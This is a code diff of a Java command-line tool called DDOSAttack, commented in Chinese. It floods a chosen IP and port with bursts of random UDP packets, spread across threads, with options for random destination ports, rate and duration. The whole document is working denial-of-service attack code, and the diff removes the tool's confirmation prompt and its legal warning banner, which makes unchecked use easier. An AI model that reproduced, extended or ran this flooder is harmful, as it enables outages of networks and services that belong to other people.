@@ -1,14 +1,33 @@
-import java.io.*;
+ import java.io.*;
 import java.net.*;
 import java.nio.ByteBuffer;
 import java.nio.channels.DatagramChannel;
-import java.text.SimpleDateFormat;
 import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.LongAdder;
 
+/**
+ *
+ * 用法示例：
+ *   java DDOSAttack -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50
+ *   java DDOSAttack -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30
+ *
+ * 参数说明：
+ *   -t, --target        目标 IP 地址（必填）
+ *   -p, --port          目标 UDP 端口（必填）
+ *   -g, --gb            总流量（GB，必填）
+ *   -P, --processes     线程数（默认 4）
+ *   -b, --burst         每突发包数（默认 50）
+ *   -r, --rate          速率限制（秒/突发，默认 0 不限速）
+ *   -d, --duration      持续时间（秒，默认 0 直到发完）
+ *   -s, --src-port      源端口基数（默认 -1 随机）
+ *   --size              包大小（字节，默认 1490）
+ *   --random-port       随机目标端口
+ *   --log               日志文件路径
+ *   --max-retries       最大重试次数（默认 3）
+ */
 public class DDOSAttack {
-    // ---------- 共享统计 (LongAdder 低竞争) ----------
+    // ---------- 共享统计 ----------
     private static final LongAdder totalSent = new LongAdder();
     private static final LongAdder totalBytes = new LongAdder();
     private static final LongAdder totalDropped = new LongAdder();
@@ -21,56 +40,57 @@ public class DDOSAttack {
     private static int packetSize = 1490;
     private static int numThreads = 4;
     private static int burstSize = 50;
-    private static double rateLimit = 0.0; // 每突发秒数
-    private static int duration = 0; // 攻击持续时间（秒），0 表示直到发完
-    private static int srcPortBase = -1; // -1 表示随机
+    private static double rateLimit = 0.0;
+    private static int duration = 0;
+    private static int srcPortBase = -1;
     private static boolean randomTargetPort = false;
     private static String logFile = null;
-    private static boolean noInteractive = false;
     private static int maxRetries = 3;
 
     private static PrintWriter logWriter = null;
 
-    // ---------- 预分配 SocketAddress 数组用于随机端口 ----------
+    // ---------- 预分配 SocketAddress 数组 ----------
     private static InetSocketAddress[] portAddresses;
 
-    // ---------- 主函数 ----------
+    // ===================================================================
+    // 主函数
+    // ===================================================================
     public static void main(String[] args) throws Exception {
-        // 1. 解析参数
+        // 1. 解析参数（无参数则显示帮助）
+        if (args.length == 0) {
+            printUsage();
+            System.exit(0);
+        }
         parseArgs(args);
 
-        // 2. 设置日志
+        // 2. 日志
         if (logFile != null) {
-            logWriter = new PrintWriter(new FileWriter(logFile, true));
-            logWriter.println("--- 攻击会话开始于 " + new Date() + " ---");
-            logWriter.flush();
+            try {
+                logWriter = new PrintWriter(new FileWriter(logFile, true));
+            } catch (IOException e) {
+                System.err.println("[!] 无法打开日志文件: " + e.getMessage());
+            }
         }
 
-        // 3. 显示横幅（警告页面 + figlet 艺术字）
-        showBanner();
-
-        // 4. 验证目标
+        // 3. 验证目标
         try {
             InetAddress.getByName(targetIP);
         } catch (UnknownHostException e) {
-            log("无效的目标 IP: " + targetIP);
+            System.err.println("[!] 无效的目标 IP: " + targetIP);
             System.exit(1);
         }
         if (targetPort < 1 || targetPort > 65535) {
-            log("端口超出范围。");
+            System.err.println("[!] 端口超出范围: " + targetPort);
             System.exit(1);
         }
-
-        // 5. 验证包大小
         if (packetSize < 64) packetSize = 64;
         if (packetSize > 65507) packetSize = 65507;
-        // 重新计算总包数（已在 parseArgs 中计算）
         if (totalPackets <= 0) {
-            log("总包数必须大于 0。");
+            System.err.println("[!] 总包数必须大于 0");
             System.exit(1);
         }
 
-        // 6. 预分配 SocketAddress 数组（如果使用随机端口）
+        // 4. 预分配地址数组
         if (randomTargetPort) {
             portAddresses = new InetSocketAddress[65536];
             for (int i = 1; i <= 65535; i++) {
@@ -78,51 +98,75 @@ public class DDOSAttack {
             }
         }
 
-        // 7. 攻击摘要
-        log("\n[>] 攻击摘要:");
-        log("    目标: " + targetIP + ":" + targetPort + " (UDP)");
-        log("    总包数: " + totalPackets);
-        log("    包大小: " + packetSize + " 字节");
-        log("    线程数: " + numThreads);
-        if (srcPortBase >= 0) {
-            log("    源端口基数: " + srcPortBase + " (每个线程偏移)");
-        }
-        if (rateLimit > 0) {
-            log("    速率限制: " + rateLimit + " 秒/突发");
-        }
-        if (duration > 0) {
-            log("    持续时间: " + duration + " 秒");
-        }
-        if (randomTargetPort) {
-            log("    随机目标端口: 开启");
-        }
-        log("    突发大小: " + burstSize);
-        log("    最大重试: " + maxRetries);
+        // 5. 一行摘要输出
+        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%n",
+                targetIP, targetPort, (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
+                totalPackets, numThreads, packetSize,
+                randomTargetPort ? "  random-port" : "");
+        System.out.println("[+] attacking... (Ctrl+C to stop)");
 
-        // 8. 确认
-        if (!noInteractive) {
-            System.out.print("\n[!] 确认攻击 (yes/no): ");
-            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
-            String confirm = reader.readLine().trim().toLowerCase();
-            if (!"yes".equals(confirm)) {
-                log("[>] 已取消。");
-                if (logWriter != null) logWriter.close();
-                System.exit(0);
-            }
-        }
+        // 6. 注册关闭钩子（Ctrl+C 停止）
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            stopFlag = true;
+        }));
 
-        // 9. 准备载荷
+        // 7. 准备载荷
         byte[] payload = new byte[packetSize];
         new Random().nextBytes(payload);
 
-        // 10. 开始攻击
+        // 8. 开始攻击
+        long startTime = System.currentTimeMillis();
         startAttack(payload);
+        long elapsed = System.currentTimeMillis() - startTime;
 
-        // 11. 清理
-        if (logWriter != null) logWriter.close();
+        // 9. 结束统计
+        long finalSent = totalSent.longValue();
+        long finalBytes = totalBytes.longValue();
+        long finalDropped = totalDropped.longValue();
+        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;
+
+        System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
+                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
+                elapsed / 1000.0, rate);
+
+        if (logWriter != null) {
+            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
+                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
+            logWriter.close();
+        }
     }
 
-    // ---------- 健壮的参数解析 ----------
+    // ===================================================================
+    // 用法帮助
+    // ===================================================================
+    private static void printUsage() {
+        System.out.println("用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
+        System.out.println();
+        System.out.println("必填参数:");
+        System.out.println("  -t, --target        目标 IP 地址");
+        System.out.println("  -p, --port          目标 UDP 端口");
+        System.out.println("  -g, --gb            总流量（GB）");
+        System.out.println();
+        System.out.println("可选参数:");
+        System.out.println("  -P, --processes     线程数（默认 4）");
+        System.out.println("  -b, --burst         每突发包数（默认 50）");
+        System.out.println("  -r, --rate          速率限制（秒/突发，默认 0）");
+        System.out.println("  -d, --duration      持续时间（秒，默认 0 直到发完）");
+        System.out.println("  -s, --src-port      源端口基数（默认 -1 随机）");
+        System.out.println("      --size          包大小（字节，默认 1490）");
+        System.out.println("      --random-port   随机目标端口");
+        System.out.println("      --log <file>    日志文件路径");
+        System.out.println("      --max-retries   最大重试次数（默认 3）");
+        System.out.println("  -h, --help          显示本帮助");
+        System.out.println();
+        System.out.println("示例:");
+        System.out.println("  java DDOSAttack -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50");
+        System.out.println("  java DDOSAttack -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30");
+    }
+
+    // ===================================================================
+    // 参数解析
+    // ===================================================================
     private static void parseArgs(String[] args) {
         Map<String, String> params = new HashMap<>();
         for (int i = 0; i < args.length; i++) {
@@ -136,126 +180,56 @@ public class DDOSAttack {
             }
         }
 
+        if (params.containsKey("-h") || params.containsKey("--help")) {
+            printUsage();
+            System.exit(0);
+        }
+
         targetIP = params.getOrDefault("-t", params.get("--target"));
         if (targetIP == null) {
-            System.err.println("缺少 -t/--target");
+            System.err.println("[!] 缺少 -t/--target");
             System.exit(1);
         }
 
         String portStr = params.getOrDefault("-p", params.get("--port"));
-        if (portStr != null) targetPort = Integer.parseInt(portStr);
-        else { System.err.println("缺少 -p/--port"); System.exit(1); }
-
-        String gbStr = params.getOrDefault("-g", params.get("--gb"));
-        if (gbStr != null) {
-            double gb = Double.parseDouble(gbStr);
-            params.put("_gb_value", String.valueOf(gb));
-        } else {
-            System.err.println("缺少 -g/--gb");
+        if (portStr == null) {
+            System.err.println("[!] 缺少 -p/--port");
             System.exit(1);
         }
+        targetPort = Integer.parseInt(portStr);
+
+        String gbStr = params.getOrDefault("-g", params.get("--gb"));
+        if (gbStr == null) {
+            System.err.println("[!] 缺少 -g/--gb");
+            System.exit(1);
+        }
+        double gb = Double.parseDouble(gbStr);
 
         if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
         if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
-        if (params.containsKey("-b") || params.containsKey("--burst"))
-            burstSize = Integer.parseInt(params.getOrDefault("-b", params.get("--burst")));
-        if (params.containsKey("-r") || params.containsKey("--rate"))
-            rateLimit = Double.parseDouble(params.getOrDefault("-r", params.get("--rate")));
-        if (params.containsKey("-d") || params.containsKey("--duration"))
-            duration = Integer.parseInt(params.getOrDefault("-d", params.get("--duration")));
-        if (params.containsKey("-s") || params.containsKey("--src-port"))
-            srcPortBase = Integer.parseInt(params.getOrDefault("-s", params.get("--src-port")));
-        if (params.containsKey("--size"))
-            packetSize = Integer.parseInt(params.get("--size"));
-        if (params.containsKey("--random-port"))
-            randomTargetPort = true;
-        if (params.containsKey("--log"))
-            logFile = params.get("--log");
-        if (params.containsKey("--no-interactive"))
-            noInteractive = true;
-        if (params.containsKey("--max-retries"))
-            maxRetries = Integer.parseInt(params.get("--max-retries"));
+        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
+        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
+        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
+        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
+        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
+        if (params.containsKey("--random-port")) randomTargetPort = true;
+        if (params.containsKey("--log")) logFile = params.get("--log");
+        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));
 
-        // 从 _gb_value 计算总包数
-        double gb = Double.parseDouble(params.getOrDefault("_gb_value", "0"));
-        if (gb <= 0) { System.err.println("GB 必须大于 0"); System.exit(1); }
+        if (gb <= 0) {
+            System.err.println("[!] GB 必须大于 0");
+            System.exit(1);
+        }
         totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
-        if (totalPackets <= 0) { System.err.println("流量太小"); System.exit(1); }
-    }
-
-    // ---------- 日志 ----------
-    private static void log(String msg) {
-        System.out.println(msg);
-        if (logWriter != null) {
-            logWriter.println(msg);
-            logWriter.flush();
+        if (totalPackets <= 0) {
+            System.err.println("[!] 流量太小");
+            System.exit(1);
         }
     }
 
-    // ---------- 横幅 ----------
-    private static void showBanner() {
-        // ================= 1. 警告页面 ===================
-        clearScreen();
-        System.out.println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809");
-        System.out.println("M       MMM M       MMM MMM     MMM MM       MM   BC-809");
-        System.out.println("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809");
-        System.out.println("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809");
-        System.out.println("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809");
-        System.out.println("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809");
-        System.out.println("M        MM M        MM MMM     MMM MM       MM   BC-809");
-        System.out.println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809");
-        System.out.println("\n");
-        System.out.println("========================= 警告 ==========================");
-        System.out.println("你正在跨越法律和道德的边界。请立即退出，或等待 3 秒后启动。");
-        System.out.println("========================================================");
-        try {
-            for (int i = 3; i > 0; i--) {
-                System.out.println(i);
-                Thread.sleep(1000);
-            }
-            System.out.println("启动中...");
-            Thread.sleep(500);
-        } catch (InterruptedException ignored) {}
-
-        // ====== 2. 清屏后显示 figlet 艺术字 ======
-        clearScreen();
-        // 尝试运行 figlet DDOS-Attack
-        try {
-            Process p = Runtime.getRuntime().exec(new String[]{"figlet", "DDOS-Attack"});
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    System.out.println(line);
-                }
-            }
-            p.waitFor();
-        } catch (Exception e) {
-            // 降级 ASCII 艺术字
-            System.out.println(" ____  ____   ___  ____          _   _   _             _     ");
-            System.out.println("|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ");
-            System.out.println("| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ");
-            System.out.println("| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ");
-            System.out.println("|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ");
-        }
-        System.out.println("作者  : BCU-0");
-        System.out.println("GitHub: https://github.com/BC-809/DDOS-Attack.git");
-        System.out.println();
-    }
-
-    private static void clearScreen() {
-        try {
-            String os = System.getProperty("os.name").toLowerCase();
-            if (os.contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            }
-        } catch (Exception e) {
-            // 忽略清屏错误
-        }
-    }
-
-    // ---------- 重试逻辑 ----------
+    // ===================================================================
+    // 重试逻辑
+    // ===================================================================
     private static boolean sendWithRetry(DatagramChannel channel, ByteBuffer buffer,
                                          SocketAddress target, int maxRetries) {
         int attempts = 0;
@@ -263,9 +237,7 @@ public class DDOSAttack {
             try {
                 buffer.clear();
                 int written = channel.send(buffer, target);
-                if (written > 0) {
-                    return true;
-                }
+                if (written > 0) return true;
             } catch (IOException e) {
                 // 忽略，继续重试
             }
@@ -274,15 +246,14 @@ public class DDOSAttack {
         return false;
     }
 
-    // ---------- 攻击 ----------
+    // ===================================================================
+    // 攻击主体
+    // ===================================================================
     private static void startAttack(byte[] payload) throws Exception {
-        // 使用固定线程池
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
         List<Future<?>> futures = new ArrayList<>();
         long packetsPerThread = totalPackets / numThreads;
         long extra = totalPackets % numThreads;
-
-        final long startTime = System.currentTimeMillis();
 
         for (int i = 0; i < numThreads; i++) {
             long pktCount = packetsPerThread + (i < extra ? 1 : 0);
@@ -290,18 +261,16 @@ public class DDOSAttack {
             Runnable task = () -> {
                 ThreadLocalRandom random = ThreadLocalRandom.current();
                 try (DatagramChannel channel = DatagramChannel.open()) {
-                    channel.configureBlocking(true); // 阻塞模式保证可靠性
+                    channel.configureBlocking(true);
                     InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);
 
-                    // 源端口绑定
                     if (srcPortBase >= 0) {
                         int srcPort = srcPortBase + threadId;
                         DatagramSocket socket = channel.socket();
                         try {
                             socket.bind(new InetSocketAddress(srcPort));
                         } catch (BindException e) {
-                            log("[!] 线程 " + threadId + ": 绑定端口 " + srcPort +
-                                    " 失败，使用随机端口。原因: " + e.getMessage());
+                            System.err.println("[!] 线程 " + threadId + ": 绑定端口 " + srcPort + " 失败");
                         }
                     }
 
@@ -309,9 +278,7 @@ public class DDOSAttack {
                     long sent = 0;
                     long bytesSent = 0;
                     long dropped = 0;
-                    long lastReportedSent = 0;
-                    long lastReportedBytes = 0;
-                    long lastReportedDropped = 0;
+                    long lastSent = 0, lastBytes = 0, lastDropped = 0;
 
                     while (!stopFlag && sent < pktCount) {
                         int toSend = (int) Math.min(burstSize, pktCount - sent);
@@ -326,8 +293,7 @@ public class DDOSAttack {
                                 targetAddr = dest;
                             }
 
-                            boolean success = sendWithRetry(channel, buffer, targetAddr, maxRetries);
-                            if (success) {
+                            if (sendWithRetry(channel, buffer, targetAddr, maxRetries)) {
                                 sent++;
                                 bytesSent += packetSize;
                             } else {
@@ -335,88 +301,81 @@ public class DDOSAttack {
                             }
                         }
 
-                        // --- 增量更新全局统计 ---
-                        long deltaSent = sent - lastReportedSent;
-                        long deltaBytes = bytesSent - lastReportedBytes;
-                        long deltaDropped = dropped - lastReportedDropped;
-                        if (deltaSent > 0) {
-                            totalSent.add(deltaSent);
-                        }
-                        if (deltaBytes > 0) {
-                            totalBytes.add(deltaBytes);
-                        }
-                        if (deltaDropped > 0) {
-                            totalDropped.add(deltaDropped);
-                        }
-                        // 更新上次上报值
-                        lastReportedSent = sent;
-                        lastReportedBytes = bytesSent;
-                        lastReportedDropped = dropped;
+                        // 增量更新全局统计
+                        long dSent = sent - lastSent;
+                        long dBytes = bytesSent - lastBytes;
+                        long dDropped = dropped - lastDropped;
+                        if (dSent > 0) totalSent.add(dSent);
+                        if (dBytes > 0) totalBytes.add(dBytes);
+                        if (dDropped > 0) totalDropped.add(dDropped);
+                        lastSent = sent;
+                        lastBytes = bytesSent;
+                        lastDropped = dropped;
 
-                        // 速率限制：如果大于 0 则休眠；否则忙循环
                         if (rateLimit > 0) {
                             Thread.sleep((long) (rateLimit * 1000));
                         }
                     }
 
-                    // 线程结束前最后一次增量更新
-                    long deltaSent = sent - lastReportedSent;
-                    long deltaBytes = bytesSent - lastReportedBytes;
-                    long deltaDropped = dropped - lastReportedDropped;
-                    if (deltaSent > 0) totalSent.add(deltaSent);
-                    if (deltaBytes > 0) totalBytes.add(deltaBytes);
-                    if (deltaDropped > 0) totalDropped.add(deltaDropped);
+                    // 最后一次增量更新
+                    long dSent = sent - lastSent;
+                    long dBytes = bytesSent - lastBytes;
+                    long dDropped = dropped - lastDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
 
                 } catch (Exception e) {
-                    log("线程 " + threadId + " 错误: " + e.getMessage());
+                    System.err.println("[!] 线程 " + threadId + " 错误: " + e.getMessage());
                 }
             };
             futures.add(executor.submit(task));
         }
 
-        // 进度监控
-        Thread monitor = new Thread(() -> {
-            long start = System.currentTimeMillis();
-            while (!stopFlag) {
-                long elapsed = System.currentTimeMillis() - start;
-                long sent = totalSent.longValue();
-                long bytes = totalBytes.longValue();
-                long dropped = totalDropped.longValue();
-                if (sent >= totalPackets) break;
-                if (duration > 0 && elapsed / 1000 >= duration) {
-                    stopFlag = true;
-                    break;
-                }
-                if (elapsed > 0 && sent > 0) {
-                    double progress = (double) sent / totalPackets * 100;
-                    int barLen = 30;
-                    int filled = (int) (barLen * progress / 100);
-                    StringBuilder bar = new StringBuilder();
-                    for (int i = 0; i < filled; i++) bar.append('█');
-                    for (int i = filled; i < barLen; i++) bar.append('░');
-                    double eta = (elapsed / (double) sent) * (totalPackets - sent) / 1000;
-                    double rate = sent / (elapsed / 1000.0);
-                    double dataGB = bytes / (1024.0 * 1024 * 1024);
-                    System.out.printf("\r[%s] %.1f%% | %d/%d 包 | %.3f GB | 速率: %.1f pps | 丢弃: %d | 剩余时间: %.0fs",
-                            bar, progress, sent, totalPackets, dataGB, rate, dropped, eta);
-                }
-                try {
-                    Thread.sleep(500);
-                } catch (InterruptedException ignored) {}
-            }
-        });
-        monitor.setDaemon(true);
-        monitor.start();
+        // ---------- 进度监控 ----------
+        long start = System.currentTimeMillis();
+        long lastReportTime = start;
+        long lastReportSent = 0;
 
-        // 等待攻击结束
-        if (duration > 0) {
-            Thread.sleep(duration * 1000L);
-            stopFlag = true;
-        } else {
-            for (Future<?> f : futures) {
-                try { f.get(); } catch (Exception ignored) {}
+        while (!stopFlag) {
+            long now = System.currentTimeMillis();
+            long elapsed = now - start;
+            long sent = totalSent.longValue();
+            long bytes = totalBytes.longValue();
+            long dropped = totalDropped.longValue();
+
+            if (sent >= totalPackets) break;
+
+            if (duration > 0 && elapsed / 1000 >= duration) {
+                stopFlag = true;
+                break;
             }
-            stopFlag = true;
+
+            // 每 1 秒输出一行简短统计
+            if (now - lastReportTime >= 1000) {
+                long deltaSent = sent - lastReportSent;
+                double deltaTime = (now - lastReportTime) / 1000.0;
+                double instantRate = deltaSent / deltaTime;
+                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
+                double dataGB = bytes / (1024.0 * 1024 * 1024);
+                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
+                        sent, dataGB, rate, instantRate, dropped);
+                if (logWriter != null) {
+                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
+                            sent, dataGB, rate, dropped);
+                    logWriter.flush();
+                }
+                lastReportTime = now;
+                lastReportSent = sent;
+            }
+
+            Thread.sleep(100);
+        }
+
+        // 等待所有线程结束
+        stopFlag = true;
+        for (Future<?> f : futures) {
+            try { f.get(); } catch (Exception ignored) {}
         }
 
         executor.shutdown();
@@ -426,20 +385,6 @@ public class DDOSAttack {
             }
         } catch (InterruptedException e) {
             executor.shutdownNow();
-        }
-
-        // 最终统计
-        long elapsed = System.currentTimeMillis() - startTime;
-        long finalSent = totalSent.longValue();
-        long finalBytes = totalBytes.longValue();
-        long finalDropped = totalDropped.longValue();
-        log("\n[>] 攻击结束。");
-        log("    发送包数: " + finalSent);
-        log("    丢弃包数: " + finalDropped);
-        log("    总数据量: " + (finalBytes / (1024.0 * 1024 * 1024)) + " GB");
-        log("    耗时: " + (elapsed / 1000.0) + " 秒");
-        if (elapsed > 0) {
-            log("    平均速率: " + (finalSent / (elapsed / 1000.0)) + " pps");
         }
     }
 }
